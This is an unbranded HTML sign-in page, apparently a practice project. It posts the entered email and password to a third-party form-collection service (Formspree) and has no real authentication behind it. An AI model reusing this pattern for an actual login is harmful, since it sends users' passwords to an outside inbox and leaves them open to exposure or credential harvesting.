<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Login Form</title>
    <link rel="stylesheet" href="css/style.css">
</head>
<body>
    <form 
    class="login"
    action="https://formspree.io/f/xrgwkekz"
    method="POST"
    >
        <h2>Please sign in</h2>
        <div class="inputs">
            <input type="email" name="email" placeholder="Email address" autofocus minlength="4" maxlength="255">
            <input type="password" name="password" placeholder="Password" minlength="4" maxlength="255">
        </div>
        <div class="remember">
            <input type="checkbox" name="remember" id="remember">
            <label for="remember">Remember me</label>
        </div>
        <button type="submit">Sign in</button>
        <p>Copyright &copy; 2023</p>
    </form>
</body>
</html>
